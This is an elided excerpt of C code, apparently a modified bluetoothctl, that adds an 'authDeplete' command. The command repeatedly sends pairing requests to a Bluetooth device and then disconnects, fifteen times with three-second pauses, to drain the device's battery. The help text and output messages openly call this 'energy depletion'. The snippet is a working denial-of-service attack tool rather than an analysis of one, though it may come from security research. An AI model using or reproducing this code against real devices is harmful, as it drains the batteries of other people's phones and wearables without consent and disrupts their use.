...
static void pair_reply(DBusMessage *message, void *user_data)
{
	...
	rl_printf("Energy depletion successful\n");
}
...
static void cmd_authDeplete(const char *arg){
    GDBusProxy *proxy;
    ...
    for ( int i = 0 ; i < 15 ; i ++){
        ...
        if (g_dbus_proxy_method_call(proxy, "Pair", NULL, pair_reply,
                                     NULL, NULL) == FALSE) {
            rl_printf("Something wrong\n");
            return;
        }
        printf("sleep 3\n");
        sleep(3);
        printf("Calling disconnect\n");
        if (g_dbus_proxy_method_call(proxy, "Disconnect", NULL, pair_reply,
                                     NULL, NULL) == FALSE) {
            rl_printf("something is wrong\n");
            return;
        }
...
static const struct {
	...
	{ "pair",         "[dev]",    cmd_pair, "Pair with device",
							dev_generator },
    { "authDeplete",         "[dev]",    cmd_authDeplete, "Execute energy depletion with authentication requests on device",
            dev_generator },
